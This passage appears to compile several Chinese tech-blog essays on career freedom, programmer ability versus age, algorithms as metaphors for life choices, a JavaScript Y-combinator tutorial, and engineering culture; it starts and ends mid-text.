**第二层自由——技能自由**。工作自由已是不错，不过前提是你还是需要依赖于别人提供的工作机会。而技能自由则是你可以用自己的技能养活自己，而不需要去公司里工作。也就是所谓的自由职业者了，社会上，这样的人也不少，比如，一些健身体育教练、设计师、翻译者、作者……这些都可以算是自由职业者，程序员这个职业中只要不是搬砖的，有想法的，就有可以成为自由积业者的潜质，想一想，你拥有的编程能力，其实是一种创造的能力，也就是创造力，只要你Make Something People Want（YC创业公司的slogan），你是完全可以通过自己的技能来养活自己的。如果你通过某些自动化的东西，或是你在App上做了一个软件个体户，让自己的收入不断，甚至你做了一个开源软件，社区每个月都给你捐款捐到比你打工挣的还多，那么你就真正的有了技能自由了。

**第三层自由——物质自由。**我把财务自由换了一种说法。我个人觉得，除了有个好爸爸之外这种特例的情况，如果你想有物质自由的话，本质上来说，你一定要学会投资，投资不一定是你的钱，时间也是一种财富，年轻更是，你怎么投资你的时间还有你的青春？你要把你的投资投到什么样的事，什么样的人？对于投资这个事，风险也比较大。但是，人生不敢冒险可能才是最大的冒险。这个世界有很多技术不是你能看书学来的，而要只能在实战中学会的，比如：游泳。投资可能也是一种。只有真正懂投资的人，或是运气非常好的人，才可能实现物质自由。

追求自由的生活，其实也是个人发展道路上的一个不错的选择。通常来说，自由的人，能力都不差，钱也不会少。因为，他们懂得投资。

也就是说，拥有追求自由能力的的人，

- 不但有领导力和创造力（也可指导大多数人并走在大多数人前面）
- 同时他还懂得怎么投资（知道时间和精力和金钱应该投在什么地方）

（注：这里我没有提精神自由，老实说，精神上的自由我也不清楚是什么东西，因为我还没有见过，眼界有限，所以先按不表了，不然真成鸡汤文了）

#### 总结

无论是在职场中打拼，还是追求精彩的经历，还是去实现自由，我觉得都是不错的个人发展的方向。

他们都有重叠，比如：

- 你可以在职场中去追求那些刺激的经历的公司。
- 同样也可以通过加入有潜力高速发展的公司来达到自由。
- 你也可以通过追寻不一样的经历来达到人生的自由。
- ……

**总之，这里的逻辑是——**

- **能够去规划自己的个人发展的人，通常都是有很多机会和可能性的人**。

- **有很多机会和可能性的人，通常都是有Leadership，喜欢冒险的人。**

- **有Leadership喜欢冒险的人，通常都是学习能力强，思维活跃，喜欢折腾，懂得“投资”的人。**

- **学习能力强思维活跃的人，通常来说，都是喜欢看书，喜欢实践和新鲜事物，不怕艰难和挑战，用智力而不是使蛮力的人。**

- **懂得“投资”的人，通常来说，他们更多的关注的是未来和长远的成长，而不是当下的KPI、奖金和晋升。**

 

![电影《飞屋环游记》](photo/up.jpg)插图来自电影《飞屋环游记》

**最后祝大家新年快乐，来年大展鸿图。**

（全文完）

# 编程能力与编程年龄

#####  [2013年11月13日 ](https://coolshell.cn/articles/10688.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [472 条评论](https://coolshell.cn/articles/10688.html#comments) 416,364 人阅读

程序员这个职业究竟可以干多少年，在中国这片神奇的土地上，很多人都说只能干到30岁，然后就需要转型，就像《[程序员技术练级攻略](https://coolshell.cn/articles/4990.html)》这篇文章很多人回复到这种玩法会玩死人的一样。我在很多面试中，问到应聘者未来的规划都能听到好些应聘都说程序员是个青春饭。因为，大多数程序员都认为，编程这个事只能干到30岁，最多35岁吧。每每我听到这样的言论，都让我感到相当的无语，大家都希望能像《[21天速成C++](https://coolshell.cn/articles/2250.html)》那样速成，好多时候超级有想和他们争论的冲动，但后来想想算了，因为**你无法帮助那些只想呆在井底思维封闭而且想走捷径速成的人**。

今天，我们又来谈这个老话题，因为我看到一篇论文，但是也一定会有很多人都会找出各种理由来论证这篇论文的是错的，无所谓了，我把这篇文章送给那些和我一样准备为技术和编程执着和坚持的人。

目录



[论文](https://coolshell.cn/articles/10688.html#论文)[年龄分布图](https://coolshell.cn/articles/10688.html#年龄分布图)[能力和年龄分布图](https://coolshell.cn/articles/10688.html#能力和年龄分布图)[年纪大的人是否跟不上新技术](https://coolshell.cn/articles/10688.html#年纪大的人是否跟不上新技术)[结论](https://coolshell.cn/articles/10688.html#结论)[我的一些感受](https://coolshell.cn/articles/10688.html#我的一些感受)

#### 论文

首先，我们先来看一篇论文《[Is Programming Knowledge Related to Age?](http://people.engr.ncsu.edu/ermurph3/papers/msr13.pdf)》（PDF链接），这篇论文是两个北卡罗莱纳州立大学计算机科学系的两个人Patrick Morrison 和 Emerson Murphy-Hill 对StackOverflow.com上的用户做了相关的数据挖掘得出来的一些数据。（我们知道StackOverflow.com上的数据是公开的，任何人都可以用来分析和统计，所以这篇论文的真实性是有的）

数据采样和清洗条件如下：（数据全量是1694981用户，平均年龄30.3岁）

- 15-70岁之间的用户（这年龄段的用户被称做“Working age”），当然，有很多用户没有输入年龄，这些用户都被过滤了。
- 用户在2012年内都回答过问题。因为StackOverflow在2012年对问题和答案的质量要求得比以前高了一倍，所以更能反映程序员的真实水平。
- Reputation声望在2-100K之间。（注：StackOverflow的用户Reputation是得到社会认可的，在面试和招聘中是硬通货币。比大学的学分更有价值）

上述的条件一共过滤出84,248名程序员，平均年龄：29.02岁，平均Reputaion在1073.9分。



##### 年龄分布图

下面我们来看一下他们的年龄分布图：我们可以看到程序员年纪的正态分布（高点在25岁左右，但是中点在29岁左右）

![img](photo/StackOverflow-Analysis-01.jpg)

##### 能力和年龄分布图

然后，计算每个人每个月的Reputation，这样可以找到这个用户的真正的活跃时间，这样便于计算这个程序员的真实能力。（总声望 / 活跃时间），可以得到他平均每个月得来的Reputation。

我们来看看程序员的能力和年龄段的分布图：（你可能会大吃一惊）

![img](photo/StackOverflow-Analysis-02.jpg)

上图中我们可以看到，程序员的能力在从25岁左右开始上升，一直到50岁后才会开始下降。所以说，程序员吃的不是青春饭。只有码农，靠蛮力，用体力而不是用脑力的程序员才是吃青春饭的人。

##### 年纪大的人是否跟不上新技术

论文的作者分析了Tag，用了最近5年内比较流行的技术Tag，然后用了一套比较严谨的算法来查看那些所谓的“老程序员”是否在新技术上跟上不了，所谓跟不上，也就是这些老的程序员在回答这些新技术上并不活跃。所谓老，就是37岁以上的程序员（就是我现在的年纪）。

得到了下表：可以看到，老程序员和年轻的程序员对于一些新技术的学习来说也是差不多的，甚至有些项还超过了年轻的程序员。

![img](photo/StackOverflow-Analysis-03.jpg)

##### 结论

论文的结论是：

**1）程序员技术能力上升是可以到50岁或60岁的。**

**2）老程序员在获取新技术上的能力并不比年轻的程序员差。**

#### 我的一些感受

最后，我说一说我的一些感受：

- 这些年来的对于外企和国内感受—— **国外牛B的IT公司的工程能力并不见得比国内的要强多少，但是国外那些NB的IT公司的架构和设计能力远远超过国内的公司，最可怕的是，那些有超强架构和设计能力的“老程序员们”还战斗在一线，这些战斗在一线的老鸟的能力绝对超过100个普能的新手。**

- 对年轻程序员的感受——国内新一代的程序员们太浮燥了。**老实说，对于大多数人来说，如果你没有编程到30岁，你还不能成为一个“合格”的程序员**。**所以，并不是编程编到30岁就玩完了，而是编程编到30岁才刚刚入门。**这些不合格的程序，整天BS这个不好，那个不好的，而且喜欢速成，好大喜功。

- 我是一个奔四的人了，编程就像登山一样，越往上爬人越少，所以，在我这个年纪还有想法，对编程还有热情的人不多了，基本上都是转Manager了。**其实，什么职位，Title都是虚的，公司没了什么都没了，只有技术才是硬通货。而且，越是这个年纪还在玩编程玩技术的人，其实其经验和能力都是比较强的，都是中坚力量，如果还有其它这个年纪和我一样的人，求交往**。

（全文完）

# 程序算法与人生选择

#####  [2012年12月28日 ](https://coolshell.cn/articles/8790.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [220 条评论](https://coolshell.cn/articles/8790.html#comments) 167,759 人阅读

![img](photo/choice.jpg)每年一到要找工作的时候，我就能收到很多人给我发来的邮件，总是问我怎么选择他们的offer，去腾讯还是去豆瓣，去外企还是去国内的企业，去创业还是去考研，来北京还是回老家，该不该去创新工场？该不该去thoughtworks？……等等，等等。今年从7月份到现在，我收到并回复了60多封这样的邮件。我更多帮他们整理思路，帮他们明白自己最想要的是什么。（注：我以后不再回复类似的邮件了）。

我深深地发现，对于我国这样从小被父母和老师安排各种事情长大的人，当有一天，父母和老师都跟不上的时候，我们几乎完全不知道怎么去做选择。而我最近也离开了亚马逊，换了一个工作。又正值年底，就像去年的那篇《[三个故事和三个问题](https://coolshell.cn/articles/6142.html)》一样，让我想到写一篇这样的文章。

目录



[几个例子](https://coolshell.cn/articles/8790.html#几个例子)[排序算法](https://coolshell.cn/articles/8790.html#排序算法)[贪婪算法](https://coolshell.cn/articles/8790.html#贪婪算法)[动态规划](https://coolshell.cn/articles/8790.html#动态规划)[Dijkstra最短路径](https://coolshell.cn/articles/8790.html#Dijkstra最短路径)[算法就是Trade-Off](https://coolshell.cn/articles/8790.html#算法就是Trade-Off)

#### 几个例子

当我们在面对各种对选择的影响因子的时候，如：城市，公司规模，公司性质，薪水，项目，户口，技术，方向，眼界…… 你总会发现，你会在几个公司中纠结一些东西，举几个例子：

- 某网友和我说，他们去上海腾讯，因为腾讯的规模很大，但却发现薪水待遇没有豆瓣高（低的还不是一点），如果以后要换工作的话，起薪点直接关系到了以后的高工资。我说那就去豆瓣吧，他说豆瓣在北京，污染那么严重，又没有户口，生存环境不好。我说去腾讯吧，他说腾讯最近组织调整，不稳定。我说那就去豆瓣吧，慢公司，发展很稳当。他说，豆瓣的盈利不清楚，而且用Python，自己不喜欢。我说，那就去腾讯吧，……

- 还有一网友和我说，他想回老家，因为老家的人脉关系比较好，能混得好。但又想留在大城市，因为大城市可以开眼界。



- 另一网友和我说，他想进外企，练练英语，开开眼界，但是又怕在外企里当个螺丝钉，想法得不到实施。朋友拉他去创业，觉得创业挺好的，锻炼大，但是朋友做的那个不知道能不能做好。

- 还有一网友在创新工场的某团队和考研之间抉择，不知道去创新工场行不行，觉得那个项目一般，但是感觉那个团队挺有激情的，另一方面觉得自己的学历还不够，读个研应该能找到更好的工作。

- 还有一些朋友问题我应该学什么技术？不应该学什么技术？或是怎么学会学得最快，技术的路径应该是什么？有的说只做后端不做前端，有的说，只做算法研究，不做工程，等等，等等。因为他们觉得人生有限，术业有专攻。

- 等等，等等……

我个人觉得，如果是非计算机科班出生的人不会做选择，不知道怎么走也罢了，但是我们计算机科班出生的人是学过算法的，**懂算法的人应该是知道怎么做选择的**。

#### 

#### 排序算法

你不可能要所有的东西，所以你只能要你最重要的东西，你要知道什么东西最重要，你就需要对你心内的那些欲望和抱负有清楚的认识，不然，你就会在纠结中度过。

所以，在选择中纠结的人有必要参考一下排序算法。

- 首先，你最需要参考的就是“冒泡排序”——这种算法的思路就是每次冒泡出一个最大的数。所以，你有必要问问你自己，面对那些影响你选择的因子，如果你只能要一个的话，你会要哪个？而剩下的都可以放弃。于是，当你把最大的数，一个一个冒泡出来的时候，并用这个决策因子来过滤选项的时候，你就能比较容易地知道知道你应该选什么了。**这个算法告诉我们，人的杂念越少，就越容易做出选择。**

- 好吧，可能你已茫然到了怎么比较两个决策因子的大小，比如：你分不清楚，工资>业务前景吗？业务前景>能力提升吗？所以你完全没有办法进行冒泡法。那你，你不妨参考一个“快速排序”的思路——这个算法告诉我们，我们一开始并不需要找到最大的数，我们只需要把你价值观中的某个标准拿出来，然后，把可以满足这个价值的放到右边，不能的放到左边去。比如，你的标准是：工资大于5000元&&业务前景长于3年的公司，你可以用这个标准来过滤你的选项。然后，你可以再调整这个标准再继续递归下去。**这个算法告诉我们，我们的选择标准越清晰，我们就越容易做出选择**。

这是排序算法中最经典的两个算法了，面试必考。相信你已烂熟于心中了。所以，我觉得你把这个算法应用于你的人生选择也应该不是什么问题。关于在于，你是否知道自己想要的是什么？

排序算法的核心思想就是，**让你帮助你认清自己最需要的是什么，认清自己最想要的是什么，然后根据这个去做选择**。

#### 贪婪算法

所谓贪婪算法，是一种在每一步选择中都采取在当前状态下最好或最优（即最有利）的选择（注意：是当前状态下），从而希望导致结果是最好或最优的算法。贪婪算法最经典的一个例子就是[哈夫曼编码](https://coolshell.cn/articles/7459.html)。

对于人类来说，一般人在行为处事的时候都会使用到贪婪算法，

- 比如在找零钱的时候，如果要找补36元，我们一般会按这样的顺序找钱：20元，10元，5元，1元。

- 或者我们在过十字路口的时候，要从到对角线的那个街区时，我们也会使用贪婪算法——哪边的绿灯先亮了我们就先过到那边去，然后再转身90度等红灯再过街。

这样的例子有很多。对于选择中，大多数人都会选用贪婪算法，因为这是一个比较简单的算法，未来太复杂了，只能走一步看一步，在当前的状况下做出最利于自己的判断和选择即可。

有的人会贪婪薪水，有的人会贪婪做的项目，有的人会贪婪业务，有的人会贪婪职位，有的人会贪婪自己的兴趣……这些都没什么问题。贪婪算法并没有错，虽然不是全局最优解，但其可以让你找到局部最优解或是次优解。其实，有次优解也不错了。**贪婪算法基本上是一种急功近利的算法，但是并不代表这种算法不好，如果贪婪的是一种长远和持续，又未尝不可呢？**。

#### 动态规划

但是我们知道，对于大部分的问题，贪婪法通常都不能找出最优解，因为他们一般没有测试所有可能的解。**因为贪婪算法是一种短视的行为，只会跟据当前的形式做判断，也就是过早做决定**，因而没法达到最佳解。

动态规划和贪婪算法的最大不同是，贪婪算法做出选择，不能在过程优化。动态规划则会保存以前的运算结果，并根据以前的结果对当前进行选择，会动态优化功能。

动态规划算法至少告诉我们两个事：

1）**承前启后非常重要，**当你准备去做遍历的时候，你的上次的经历不但能开启你以后的经历，而且还能为后面的经历所用。你的每一步都没有浪费。

2）**是否可以回退也很重要**。这意思是——如果你面前有两个选择，一个是A公司一个是B公司，如果今天你选了A公司，并不是你完全放弃了B公司。而是，你知道从A公司退出来去B公司，会比从B公司退出来去A公司要容易一些。

比如说：你有两个offer，一个是Yahoo，一个是Baidu，上述的第一点会让我们思考，我以前的特长和能力更符合Yahoo还是Baidu？而Yahoo和Baidu谁能给我开启更大的平台？上述的第二点告诉我们，是进入Yahoo后如果没有选好，是否还能再选择Baidu公司？还是进入Baidu公司后能容易回退到Yahoo公司？

#### **Dijkstra**最短路径

最短路径是一个Greedy + DP的算法。相当经典。这个算法的大意如下：

1）在初始化的时候，所有的结点都和我是无穷大，默认是达不到的。

2）从离自己最近的结点开始贪婪。

3）走过去，看看又能到达什么样的结点，计算并更新到所有目标点的距离。

4）再贪婪与原点最短的结点，如此反复。

这个算法给我们带来了一些这样的启示：

- 有朋友和我说过他想成为一个架构师，或是某技术领域的专家，并会踏踏实实的向这个目标前进，永不放弃。我还是鼓励了他，但我也告诉他了这个著名的算法，我说，这个算法告诉你，架构师或某领域的专家对你来说目前的距离是无穷大，他们放在心中，先看看你能够得着的东西。**所谓踏实，并不是踏踏实实追求你的目标，而是踏踏实实把你够得着看得见的就在身边的东西干好。**我还记得我刚参加工作，从老家出来的时候，从来没有想过要成为一个技术牛人，也从来没有想过我的博客会那么的有影响力，在做自己力所能及，看得见摸得着的事情，我就看见什么技术就学什么，学着学着就知道怎么学更轻松，怎么学更扎实，这也许就是我的最短路径。

- 有很多朋友问我要不要学C++，或是问我学Python还是学Ruby，是不是不用学前端，等等。这些朋友告诉我，他们不可能学习多个语言，学了不用也就忘了，而且术业有专攻。这并没有什么不对的，只是我个人觉得，学习一个东西没有必要只有两种状态，一种是不学，另一种是精通。了解一个技术其实花不了多少时间，我学C++的目的其实是为了更懂Java，学TCP/IP协议其实是为了更懂Socket编程，很多东西都是连通和相辅相成的，学好了C/C++/Unix/TCP等这些基础技术后，我发现到达别的技术路径一下缩短了（这就是为什么[我用两天时间就可以了解Go语言的原因](https://coolshell.cn/articles/8489.html)）。**这就好像这个算法一样，算法效率不高，也许达到你的目标，你在一开始花了很长时间，遍历了很多地方，但是，这也许这就是你的最短路径（**比起你达不到要好得多**）**。

#### 算法就是Trade-Off

你根本没有办法能得到所有你想得到的东西，**任何的选择都意味着放弃**——**当你要去获得一个东西的时候，你总是需要放弃一些东西**。**人生本来就是一个跷跷板，一头上，另一头必然下**。这和我们做软件设计或算法设计一样，用时间换空间，用空间换时间，还有CAP理论，总是有很多的Trade-Off，正如这个短语的原意一样——**你总是要用某种东西去交易某种东西**。

我们都在用某种东西在交易我们的未来，有的人用自己的努力，有的人用自己的思考，有的人用自己的年轻，有的人用自己的自由，有的人用自己的价值观，有的人用自己的道德…… …… 有的人在交换金钱，有的人在交换眼界，有的人在交换经历，有的人在交换地位，有的人在交换能力，有的人在交换自由，有的人在交换兴趣，有的人在交换虚荣心，在交换安逸享乐…… ……

**每个人有每个人的算法，每个算法都有每个算法的purpose，就算大家在用同样的算法，但是每个人算法中的那些变量、开关和条件都不一样，得到的结果也不一样。我们就是生活在Matrix里的一段程序，我们每个人的算法决定着我们每个人的选择，我们的选择决定了我们的人生**。

**2012年就要过去了，祝大家新年快乐！**

![插图来自电影 Life of Pi](photo/life_of_pi_.jpg)插图来自电影 Life of Pi

（全文完）

# 如何读懂并写出装逼的函数式代码

#####  [2016年10月23日 ](https://coolshell.cn/articles/17524.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [66 条评论](https://coolshell.cn/articles/17524.html#comments) 94,570 人阅读

![drawing-recursive](photo/drawing-recursive-300x204.jpg)今天在微博上看到了 有人[分享了下面的这段函数式代码](http://weibo.com/1655747731/Ee4gU0qNn)，我把代码贴到下面，不过我对原来的代码略有改动，对于函数式的版本，咋一看，的确令人非常费解，仔细看一下，你可能就晕掉了，似乎完全就是天书，看上去非常装逼，哈哈。不过，我感觉解析那段函数式的代码可能会一个比较有趣过程，而且，我以前写过一篇《[函数式编程](https://coolshell.cn/articles/10822.html)》的入门式的文章，正好可以用这个例子，再升华一下原来的那篇文章，顺便可以向大家更好的介绍很多基础知识，所以写下这篇文章。

目录



[先看代码](https://coolshell.cn/articles/17524.html#先看代码)[Javascript的箭头函数](https://coolshell.cn/articles/17524.html#Javascript的箭头函数)[匿名函数的递归](https://coolshell.cn/articles/17524.html#匿名函数的递归)[动用高阶函数的递归](https://coolshell.cn/articles/17524.html#动用高阶函数的递归)[回顾之前的程序](https://coolshell.cn/articles/17524.html#回顾之前的程序)[其它](https://coolshell.cn/articles/17524.html#其它)

#### 先看代码

这个代码平淡无奇，就是从一个数组中找到一个数，O(n)的算法，找不到就返回 null。

下面是正常的 old-school 的方式。不用多说。

```
//正常的版本
function find (x, y) {
  for ( let i = 0; i < x.length; i++ ) {
    if ( x[i] == y ) return i;
  }
  return null;
}

let arr = [0,1,2,3,4,5]
console.log(find(arr, 2))
console.log(find(arr, 8))
```

结果到了函数式成了下面这个样子（好像上面的那些代码在下面若影若现，不过又有点不太一样，为了消掉if语言，让其看上去更像一个表达式，动用了 ? 号表达式）：

```
//函数式的版本
const find = ( f => f(f) ) ( f =>
  (next => (x, y, i = 0) =>
    ( i >= x.length) ?  null :
      ( x[i] == y ) ? i :
        next(x, y, i+1))((...args) =>
          (f(f))(...args)))

let arr = [0,1,2,3,4,5]
console.log(find(arr, 2))
console.log(find(arr, 8))
```

为了讲清这个代码，需要先补充一些知识。



#### Javascript的箭头函数

首先先简单说明一下，ECMAScript2015 引入的箭头表达式。箭头函数其实都是匿名函数，其基本语法如下：

> ```
> (param1, param2, …, paramN) => { statements } 
> (param1, param2, …, paramN) => expression
>      // 等于 :  => { return expression; } 
> 
> // 只有一个参数时,括号才可以不加:
> (singleParam) => { statements }
> singleParam => { statements }
> 
> //如果没有参数,就一定要加括号:
> () => { statements }
> ```

下面是一些示例：

```
var simple = a => a > 15 ? 15 : a; 
simple(16); // 15
simple(10); // 10

let max = (a, b) => a > b ? a : b;

// Easy array filtering, mapping, ...

var arr = [5, 6, 13, 0, 1, 18, 23];
var sum = arr.reduce((a, b) => a + b);  // 66
var even = arr.filter(v => v % 2 == 0); // [6, 0, 18]
var double = arr.map(v => v * 2);       // [10, 12, 26, 0, 2, 36, 46]
```

看上去不复杂吧。不过，上面前两个 simple 和 max 的例子都把这箭头函数赋值给了一个变量，于是它就有了一个名字。有时候，某些函数在声明的时候就是调用的时候，尤其是函数式编程中，一个函数还对外返回函数的时候。比如下在这个例子：

```
function MakePowerFn(power) {
  return function PowerFn(base) {
    return Math.pow(base, power);
  } 
}

power3 = MakePowerFn(3); //制造一个X的3次方的函数
power2 = MakePowerFn(2); //制造一个X的2次方的函数

console.log(power3(10)); //10的3次方 = 1000
console.log(power2(10)); //10的2次方 = 100
```

其实，在 MakePowerFn 函数里的那个 PowerFn 根本不需要命名，完全可以写成：

```
function MakePowerFn(power) {
  return function(base) {
    return Math.pow(base, power);
  } 
}
```

如果用箭头函数，可以写成：

```
MakePowerFn = power  => {
  return base => {
    return Math.pow(base, power);
  } 
}
```

我们还可以写得更简洁（如果用表达式的话，就不需要 { 和 }， 以及 return 语句 ）：

```
MakePowerFn = power => base => Math.pow(base, power)
```

我还是加上括号，和换行可能会更清楚一些：

```
MakePowerFn = (power) => (
  (base) => (Math.pow(base, power))
)
```

好了，有了上面的知识，我们就可以进入一个更高级的话题——匿名函数的递归。

#### 匿名函数的递归

函数式编程立志于用函数表达式消除有状态的函数，以及for/while循环，所以，在函数式编程的世界里是不应该用for/while循环的，而要改用递归（递归的性能很差，所以，一般是用尾递归来做优化，也就是把函数的计算的状态当成参数一层一层的往下传递，这样语言的编译器或解释器就不需要用函数栈来帮你保存函数的内部变量的状态了）。

好了，那么，匿名函数的递归该怎么做？

一般来说，递归的代码就是函数自己调用自己，比如我们求阶乘的代码：

```
function fact(n){
  return n==0 ? 1 :  n * fact(n-1);
};
result = fact(5);
```

在匿名函数下，这个递归该怎么写呢？对于匿名函数来说，**我们可以把匿名函数当成一个参数传给另外一个函数，因为函数的参数有名字，所以就可以调用自己了**。 如下所示：

```
function combinator(func) {
  func(func);
}
```

这个是不是有点作弊的嫌疑？Anyway，我们再往下，把上面这个函数整成箭头函数式的匿名函数的样子。

```
（func) => (func(func))
```

现在你似乎就不像作弊了吧。把上面那个求阶乘的函数套进来是这个样子：

首先，先重构一下fact，把fact中自己调用自己的名字去掉：

```
function fact(func, n) {
  return n==0 ? 1 :  n * func(func, n-1);
}

fact(fact, 5); //输出120
```

然后，我们再把上面这个版本变成箭头函数的匿名函数版：

```
var fact = (func, n) => ( n==0 ? 1 :  n * func(func, n-1) )
fact(fact, 5)
```

这里，我们依然还要用一个fact来保存这个匿名函数，我们继续，我们要让匿名函数声明的时候，就自己调用自己。

也就是说，我们要把

```
(func, n) => ( n==0 ? 1 : n * func(func, n-1) )
```

这个函数当成调用参数，传给下面这个函数：

```
(func, x) => func(func, x)
```

最终我们得到下面的代码：

```
( (func, x) => func(func, x) ) (  //函数体
  (func, n) => ( n==0 ? 1 :  n * func(func, n-1) ), //第一个调用参数
  5 //第二调用参数
); 
```

好像有点绕，anyway, 你看懂了吗？没事，我们继续。

#### 动用高阶函数的递归

但是上面这个递归的匿名函数在自己调用自己，所以，代码中有hard code的实参。我们想实参去掉，如何去掉呢？我们可以参考前面说过的那个 MakePowerFn 的例子，不过这回是递归版的高阶函数了。

```
HighOrderFact = function(func){
  return function(n){
    return n==0 ? 1 : n * func(func)(n-1);
  };
};
```

我们可以看，上面的代码简单说来就是，**需要一个函数做参数，然后返回这个函数的递归版本**。那么，我们怎么调用呢？

```
fact = HighOrderFact(HighOrderFact);
fact(5); 
```

连起来写就是：
`HighOrderFact ( HighOrderFact ) ( 5 )`

但是，这样让用户来调用很不爽，所以，以我们一个函数把 **HighOrderFact ( HighOrderFact )** 给代理一下：

```
fact = function ( hifunc ) {
  return hifunc ( hifunc );
} (
  //调用参数是一个函数
  function (func) { 
    return function(n){
      return n==0 ? 1 : n * func(func)(n-1);
    };
  }
);

fact(5); //于是我们就可以直接使用了
```

用箭头函数重构一下，是不是简洁了一些？

```
fact = (highfunc => highfunc ( highfunc ) ) (
  func => n =>  n==0 ? 1 : n * func(func)(n-1)
);
```

上面就是我们最终版的阶乘的函数式代码。

#### 回顾之前的程序

我们再来看那个查找数组的正常程序：

```
//正常的版本
function find (x, y) {
  for ( let i = 0; i < x.length; i++ ) {
    if ( x[i] == y ) return i;
  }
  return null;
}
```

先把for干掉，搞成递归版本：

```
function find (x, y, i=0) {
  if ( i >= x.length ) return null;
  if ( x[i] == y ) return i;
  return find(x, y, i+1);
}
```

然后，写出带实参的匿名函数的版本（注：其中的if代码被重构成了 ？号表达式）：

```
( (func, x, y, i) => func(func, x, y, i) ) (  //函数体
  (func, x, y, i=0) => (
      i >= x.length ?  null :
         x[i] == y  ?  i : func (func, x, y, i+1)
  ), //第一个调用参数
  arr, //第二调用参数
  2 //第三调用参数
)
```

最后，引入高阶函数，去除实参：

```
const find = ( highfunc => highfunc( highfunc ) ) (
   func => (x, y, i = 0) => (
     i >= x.length ?  null :
           x[i] == y  ?  i : func (func) (x, y, i+1)
   )
);
```

注：函数式编程装逼时一定要用const字符，这表示我写的函数里的状态是 immutable 的，天生骄傲！

再注：我写的这个比原来版的那个简单了很多，原来版本的那个又在函数中套了一套 next， 而且还动用了不定参数，当然，如果你想装逼装到天上的，理论上来说，你可以套N层，呵呵。

**现在，你可以体会到，如此逼装的是怎么来的了吧？**。

#### 其它

你还别说这就是装逼，简单来说，我们可以使用数学的方式来完成对复杂问题的描述，那怕是递归。其实，这并不是新鲜的东西，这是Alonzo Church 和 Haskell Curry 上世纪30年代提出来的东西，这个就是 Y Combinator 的玩法，关于这个东西，你可以看看下面两篇文章：

《[The Y Combinator (Slight Return)](http://mvanier.livejournal.com/2897.html)》，

《[Wikipedia: Fixed-point combinator](https://en.wikipedia.org/wiki/Fixed-point_combinator)》

（全文完）

# 什么是工程师文化？

#####  [2016年09月18日 ](https://coolshell.cn/articles/17497.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [124 条评论](https://coolshell.cn/articles/17497.html#comments) 141,861 人阅读

![engineer](photo/engineer.jpg)四年前，我在QCon上演讲了一个《[建一支强大的小团队](http://www.infoq.com/cn/presentations/Form-powerful-team)》（整理后的[PPT分享于这里](http://vdisk.weibo.com/s/gN-sQ/1351485199)）提到了工程师文化，今天，我想在这里再写一篇关于工程师文化的文章，一方面是因为我又有了一些想法和体会，另一方面，因为我也正走在创业的道路，毫无疑问，要建一个有浓重的工程师文化的团队或公司，所以有必要把自己的相关想法形有成白底黑字的“字据”，以供打自己的脸——“要是未来没有做到，这篇文章就打我未来的脸” || “这篇文章太幼稚了，未来的我会打我现在的脸”，当然，如果要打脸，我希望是前者。

Again，**这篇文章不是招人的贴子，因为我觉得，招聘第一重要的事，不是发招聘广告或是找猎头挖人，而是先得让自己变成一个能配得上真正工程师的公司，然后再谈吸引人的事**。

目录



[为什么要工程师文化](https://coolshell.cn/articles/17497.html#为什么要工程师文化)[工程师文化的特征](https://coolshell.cn/articles/17497.html#工程师文化的特征)[自由](https://coolshell.cn/articles/17497.html#自由)[效率](https://coolshell.cn/articles/17497.html#效率)[工程师文化如何落地](https://coolshell.cn/articles/17497.html#工程师文化如何落地)[其它](https://coolshell.cn/articles/17497.html#其它)

#### 为什么要工程师文化

看看最近二十年来社会的发展，计算机和互联网已经渗透到了这个社会的每一个角落，各式各样的计算机技术成为了整个世界发展的强大引擎，各式各样的创新，无论是业务创新还是技术创新，都是依托于技术的快速演进，技术成了解放生产力提高社会运作的效率的中坚力量。以美帝为首的技术创新公司着着实实的改变着这个世界和人类的生活和生产习惯。

**今天，每个从事计算机行业的技术人员都应该感到幸运，因为，我们不但选对了行业，也出生在了正确的时代，可以感受到前所未有的刺激和变化，相比起我们的父辈，我们的人生，能经历这样的时代，实在是一种幸运。**所以，选对了职业并出生在了正确的年代的我们，此时只需要思考的一个问题，那就是，我是否呆在了正确的地方用正确的方式做事？



在我看来，这个世界上有三种商业公司，

- **运营或销售驱动型的公司**。这类的公司以运营和营销见长，技术对于他们来说，更多的只是为了支持大规模的营销活动，以及成本上的控制，所以，基本上来说不太需要技术创新。这种公司最大的问题就是缺乏安全感。

- **产品驱动型的公司**。这类公司以产品见长，通过创造能提升用户生活体验的产品见长，技术对于他们来说，除了支持大规模的在线用户之外，他们会更多的去寻找那些为了增强用户体验，提高整个业务流程效率的技术创新。比如：UI的交互方面的，整个业务流程方面的。这种公司最大的问题，就是容易被别人模仿和抄袭。

- **技术驱动型的公司**。这类的公司相信技术能改变世界，他们更多的是用强大的工程技术来创造有颠覆性的东西，更多的是用各种自动化的技术取代人类。比如：近代的蒸汽机技术取代了大量的人工，数字技术取代了大量信息传递的人工，现代，这类公司还希望通过人工智能来取代愚蠢的人类来做决定。这种公司最大的问题就是可能做出叫好不叫座的东西。

这三种公司都可能成功，也都有问题，但是，无一例外，他们都需要强大的技术支撑，只不过，他们把技术所放在的位置不一样。

无论你有多么的看不起技术人员，你都无法否认，你今天的生活相当的依赖这帮工程师，没有他们，你恐怕都不知道怎么生活了。邓爷爷几十年前就说过——“科学技术是第一生产力” ，无论什么样的科学技术的理论要落地都会依赖于工程技术有多先进。

所以，**在今天，作为一个IT或互联网公司，“工程师文化”不是一个问题，而是一个常识**！

#### 工程师文化的特征

我下面罗列的这些特征，来源于：Google的《[重新定义公司](https://book.douban.com/subject/26582822/)》，我在Amazon的工作经历，37Signals的《[Rework](https://coolshell.cn/articles/9156.html)》，Quora上的 [What Makes Good Engineering Culture?](https://www.quora.com/What-makes-a-good-engineering-culture) Slideshare上的 [What Makes Good Engineering Culture](http://www.slideshare.net/edmondlau/what-makes-a-great-engineering-culture)，以及我最近这半年来的一些实践。

简单说来，**我可以简单的把这多的工程师文化的总结成两大类：“自由” 和 “效率”**。

本来还应该有个“创新”，但我个人认为，**创新的前提是——在自由的环境下对提高效率的痴迷，就一定会发生创新。**

创新不是凭空出现新的东西，其实，**观察一下人类的发展史，不难发现，几乎所有的创新基本上跳出原来的思维模式用新的思维模式对原有问题的效率进行质的提升**。比如：通信、交通、医疗、教育、生活……几乎全都是在优化效率。

